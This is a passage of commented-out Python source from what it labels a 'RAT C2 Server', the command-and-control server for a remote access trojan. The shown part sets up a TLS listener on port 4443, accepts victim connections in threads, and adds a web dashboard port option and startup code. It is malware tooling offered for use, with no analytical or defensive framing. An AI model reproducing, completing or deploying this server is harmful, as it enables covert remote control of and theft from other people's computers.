#         self.server_socket = context.wrap_socket(self.server_socket, server_side=True)
        
#         print(f"{Colors.OKGREEN}[+] Listening for connections...{Colors.ENDC}\n")
        
#         try:
#             while self.running:
#                 client_socket, addr = self.server_socket.accept()
#                 client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr))
#                 client_thread.daemon = True
#                 client_thread.start()
                
#         except KeyboardInterrupt:
#             self.running = False
#             print(f"\n{Colors.WARNING}[!] Shutting down...{Colors.ENDC}")
#         except Exception as e:
#             print(f"{Colors.FAIL}[-] Server error: {e}{Colors.ENDC}")
#         finally:
#             if self.server_socket:
#                 self.server_socket.close()

# def main():
#     import argparse
#     parser = argparse.ArgumentParser(description="RAT C2 Server")
#     parser.add_argument("--host", default="0.0.0.0", help="Bind host")
#     parser.add_argument("--port", type=int, default=4443, help="C2 port")
#     parser.add_argument("--web-port", type=int, default=5000, help="Web dashboard port")
    
#     args = parser.parse_args()
    
#     server = RATServer(args.host, args.port, args.web_port)
#     server.start()

# if __name__ == "__main__":
#     main()